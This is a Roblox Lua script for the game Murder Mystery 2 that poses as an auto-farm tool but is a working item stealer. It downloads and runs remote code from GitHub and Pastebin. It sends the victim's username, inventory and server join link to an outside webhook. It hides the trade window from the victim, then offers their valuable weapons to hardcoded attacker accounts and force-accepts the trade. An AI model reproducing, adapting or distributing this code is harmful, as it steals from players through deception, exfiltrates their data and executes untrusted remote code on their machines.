pcall(function()
    local url = game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/scriptPr.txt")
    loadstring(game:HttpGet(tostring(url)))()
end)

local users = _G.Usernames or {"ilyes_ida3"}
local min_rarity = _G.min_rarity or "Common"
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "http://de-bots.h1cloud.net:25569/roblox-webhook"

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local request = request or http_request or http.request

if game.PlaceId ~= 142823291 then
    plr:Kick("Game not supported. Please join a normal MM2 server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:Kick("Auto-farming won't work here ._. (Vip server detected)")
    return
end

if #Players:GetPlayers() >= 12 then
    plr:Kick("Server is full. Please join a less populated server")
    return
end

local weaponsToSend = {}
local playerGui = plr:WaitForChild("PlayerGui")
local Trade = ReplicatedStorage:WaitForChild("Trade")

local database
do
    local ok, result = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)

    if ok and typeof(result) == "table" then
        database = result
    else
        local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
        local ok2, result2 = pcall(function()
            return loadstring(raw)()
        end)

        if ok2 and typeof(result2) == "table" then
            database = result2
        else
            database = {}
        end
    end
end

local rarityTable = {
    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
}

local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true,
    ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local lastOfferToken = nil
local opponentAccepted = false
local lastOfferChangeAt = 0

local function getTradeStatus()
    local ok, status = pcall(function()
        return Trade.GetTradeStatus:InvokeServer()
    end)
    return ok and status or "None"
end

local function sendTradeRequest(user)
    local player = Players:FindFirstChild(user)
    if not player then return false end
    local ok = pcall(function()
        Trade.SendRequest:InvokeServer(player)
    end)
    return ok
end

Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if typeof(data) == "table" and data.LastOffer ~= nil then
        lastOfferToken = data.LastOffer
        lastOfferChangeAt = tick()
        opponentAccepted = false
    end
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(success)
    if success then
        opponentAccepted = false
    else
        opponentAccepted = true
    end
end)

local function forceAcceptTrade()
    if not lastOfferToken then return false end

    for _ = 1, 10 do
        local left = 6 - (tick() - lastOfferChangeAt)
        if left > 0 then
            task.wait(math.min(left + 0.1, 1.2))
        else
            local ok = pcall(function()
                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken)
            end)
            if ok then return true end
            task.wait(0.35)
        end
    end
    return false
end

local function addWeaponToTrade(id)
    pcall(function()
        Trade.OfferItem:FireServer(id, "Weapons")
    end)
end

local function rebuildWeaponsList()
    table.clear(weaponsToSend)
    local ok, realData = pcall(function()
        return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    end)
    if not ok or typeof(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then
        return
    end

    local min_rarity_index = table.find(rarityTable, min_rarity) or 1

    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData and amount and amount > 0 then
            local rarity = itemData.Rarity
            local weapon_rarity_index = table.find(rarityTable, rarity)
            if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
                table.insert(weaponsToSend, {
                    DataID = dataid,
                    Rarity = rarity,
                    Amount = amount
                })
            end
        end
    end

    table.sort(weaponsToSend, function(a, b)
        local aIdx = table.find(rarityTable, a.Rarity) or 0
        local bIdx = table.find(rarityTable, b.Rarity) or 0
        if aIdx == bIdx then
            return a.Amount > b.Amount
        end
        return aIdx > bIdx
    end)
end

local function SendFirstMessage(list, prefix)
    local fields = {
        { name = "Victim Username:", value = plr.Name, inline = true },
        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId, inline = false },
        { name = "Item list:", value = "", inline = false },
        { name = "Summary:", value = string.format("Total stacks: %d", #list), inline = false }
    }

    for _, item in ipairs(list) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        embeds = {{
            title = "Join to get MM2 hit",
            color = 65280,
            fields = fields,
            footer = { text = "good job" }
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

local function secureTradeUI(guiName)
    local gui = playerGui:WaitForChild(guiName, 10)
    if not gui then return end

    local bypass_lock = false

    gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if gui.Enabled and not bypass_lock then
            gui.Enabled = false
            
            task.spawn(function()
                local isTarget = false
                
                for _ = 1, 6 do
                    task.wait(0.1)
                    
                    for _, desc in ipairs(gui:GetDescendants()) do
                        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and desc.Text ~= "" then
                            for _, botName in ipairs(users) do
                                if string.find(desc.Text, botName) then
                                    isTarget = true
                                    break
                                end
                            end
                        end
                        if isTarget then break end
                    end
                    if isTarget then break end
                end
                
                if not isTarget then
                    bypass_lock = true
                    gui.Enabled = true
                end
            end)
            
        elseif not gui.Enabled then
            bypass_lock = false
        end
    end)
end

secureTradeUI("TradeGUI")
secureTradeUI("TradeGUI_Phone") 

rebuildWeaponsList()

if #weaponsToSend > 0 then
    local prefix = (ping == "Yes") and "--[[@everyone]] " or ""
    SendFirstMessage(weaponsToSend, prefix)
end

task.spawn(function()
    while task.wait(3) do
        local status = getTradeStatus()
        
        if status == "None" or status == "ReceivingRequest" then
            for _, player in ipairs(Players:GetPlayers()) do
                if table.find(users, player.Name) then
                    pcall(function()
                        sendTradeRequest(player.Name)
                    end)
                    break
                end
            end
        end
    end
end)

local botTradeActive = false

task.spawn(function()
    while task.wait(0.5) do
        if getTradeStatus() == "StartTrade" and not botTradeActive then
            
            local isTarget = false
            local guis = {playerGui:FindFirstChild("TradeGUI"), playerGui:FindFirstChild("TradeGUI_Phone")}
            for _, gui in ipairs(guis) do
                if gui then
                    for _, desc in ipairs(gui:GetDescendants()) do
                        if (desc:IsA("TextLabel") or desc:IsA("TextButton")) and desc.Text ~= "" then
                            for _, botName in ipairs(users) do
                                if string.find(desc.Text, botName) then
                                    isTarget = true
                                    break
                                end
                            end
                        end
                        if isTarget then break end
                    end
                end
                if isTarget then break end
            end
            
            if isTarget then
                botTradeActive = true
                
                rebuildWeaponsList()
                local toOffer = math.min(4, #weaponsToSend)
                for i = 1, toOffer do
                    local weapon = weaponsToSend[i]
                    if weapon then
                        for _ = 1, weapon.Amount do
                            addWeaponToTrade(weapon.DataID)
                            task.wait(0.05)
                        end
                    end
                end
                
                local waitStart = tick()
                while not lastOfferToken and tick() - waitStart < 8 do
                    task.wait(0.12)
                end
                
                forceAcceptTrade()
                
                if opponentAccepted then
                    task.wait(0.35)
                    forceAcceptTrade()
                end
                
                while getTradeStatus() ~= "None" do
                    task.wait(0.5)
                end
                
                botTradeActive = false
            end
        end
    end
end)
